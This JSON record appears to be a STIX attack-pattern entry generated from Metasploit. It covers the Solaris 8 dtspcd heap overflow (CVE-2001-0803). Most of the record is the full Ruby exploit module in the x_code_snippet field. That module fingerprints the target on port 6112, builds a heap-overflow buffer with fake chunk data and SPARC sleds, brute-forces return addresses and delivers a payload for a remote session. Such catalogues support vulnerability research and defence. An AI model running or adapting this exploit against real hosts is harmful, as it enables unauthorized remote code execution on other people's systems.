{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa3c5785-e41a-4578-8483-d70ad417e28a",
    "created": "2024-08-14T16:33:57.987947Z",
    "modified": "2024-08-14T16:33:57.987952Z",
    "name": "Solaris dtspcd Heap Overflow",
    "description": " This is a port of noir's dtspcd exploit. This module should work against any vulnerable version of Solaris 8 (sparc). The original exploit code was published in the book Shellcoder's Handbook. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/dtspcd/heap_noir.rb",
            "external_id": "heap_noir.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-0803"
        },
        {
            "source_name": "reference",
            "url": "http://www.cert.org/advisories/CA-2001-31.html"
        },
        {
            "source_name": "reference",
            "url": "http://media.wiley.com/product_ancillary/83/07645446/DOWNLOAD/Source_Files.zip"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Solaris dtspcd Heap Overflow',\n      'Description'    => %q{\n          This is a port of noir's dtspcd exploit. This module should\n        work against any vulnerable version of Solaris 8 (sparc).\n        The original exploit code was published in the book\n        Shellcoder's Handbook.\n      },\n      'Author'         => [ 'noir <noir[at]uberhax0r.net>', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2001-0803'],\n          [ 'OSVDB', '4503'],\n          [ 'BID', '3517'],\n          [ 'URL', 'http://www.cert.org/advisories/CA-2001-31.html'],\n          [ 'URL', 'http://media.wiley.com/product_ancillary/83/07645446/DOWNLOAD/Source_Files.zip'],\n\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 800,\n          'BadChars' => \"\\x00\\x0d\",\n          'PrependEncoder' => (\"\\xa4\\x1c\\x40\\x11\" * 3),\n        },\n      'Platform'       => 'solaris',\n      'Arch'           => ARCH_SPARC,\n      'Targets'        =>\n        [\n          ['Solaris 8',\n            { 'Rets' =>\n              [0xff3b0000, 0x2c000, 0x2f000, 0x400, [ 0x321b4, 0x361d8, 0x361e0, 0x381e8 ] ]\n            }\n          ],\n        ],\n      'DisclosureDate' => '2002-07-10',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(6112)\n      ])\n  end\n\n\n  def exploit\n    return if not dtspcd_uname()\n\n    target['Rets'][4].each do |tjmp|\n\n      rbase = target['Rets'][1]\n\n      while (rbase < target['Rets'][2]) do\n        break if session_created?\n        begin\n          print_status(sprintf(\"Trying 0x%.8x 0x%.8x...\", target['Rets'][0] + tjmp, rbase))\n          attack(target['Rets'][0] + tjmp, rbase, payload.encoded)\n          break if session_created?\n\n          attack(target['Rets'][0] + tjmp, rbase + 4, payload.encoded)\n          rbase += target['Rets'][3]\n        rescue EOFError\n        end\n      end\n    end\n\n    handler\n    disconnect\n  end\n\n  def check\n    return Exploit::CheckCode::Detected if dtspcd_uname()\n    return Exploit::CheckCode::Safe\n  end\n\n  def dtspcd_uname\n    spc_connect()\n    spc_write(spc_register('root', \"\\x00\"), 4)\n    host, os, ver, arch = spc_read().gsub(\"\\x00\", '').split(':')\n\n    return false if not host\n\n    print_status(\"Detected dtspcd running #{os} v#{ver} on #{arch} hardware\")\n    spc_write(\"\", 2)\n    return true\n  end\n\n\n  def chunk_create(retloc, retadd)\n    \"\\x12\\x12\\x12\\x12\" +\n    [retadd].pack('N')+\n    \"\\x23\\x23\\x23\\x23\\xff\\xff\\xff\\xff\" +\n    \"\\x34\\x34\\x34\\x34\\x45\\x45\\x45\\x45\" +\n    \"\\x56\\x56\\x56\\x56\" +\n    [retloc - 8].pack('N')\n  end\n\n\n  def attack(retloc, retadd, fcode)\n    spc_connect()\n\n    begin\n      buf = (\"\\xa4\\x1c\\x40\\x11\\x20\\xbf\\xff\\xff\"  * ((4096 - 8 - fcode.length) / 8)) + fcode\n      buf << \"\\x00\\x00\\x10\\x3e\\x00\\x00\\x00\\x14\"\n      buf << \"\\x12\\x12\\x12\\x12\\xff\\xff\\xff\\xff\"\n      buf << \"\\x00\\x00\\x0f\\xf4\"\n      buf << chunk_create(retloc, retadd)\n      buf << \"X\" * ((0x103e - 8) - buf.length)\n\n      spc_write(spc_register(\"\", buf), 4)\n\n      handler\n\n    rescue EOFError\n    end\n  end\n\n\n  def spc_register(user='', buff='')\n    \"4 \\x00#{user}\\x00\\x0010\\x00#{buff}\"\n  end\n\n  def spc_write(buff = '', cmd='')\n    sock.put(sprintf(\"%08x%02x%04x%04x  %s\", 2, cmd, buff.length, (@spc_seq += 1), buff))\n  end\n\n  def spc_read\n    # Bytes: 0-9 = channel, 9-10 = cmd, 10-13 = mbl, 14-17 = seq\n    head = sock.get_once(20)\n    sock.get_once( head[10, 13].hex ) || ''\n  end\n\n  def spc_connect\n    disconnect\n    connect\n    @spc_seq = 0\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-07-10",
    "x_mitre_platforms": [
        "solaris'"
    ]
}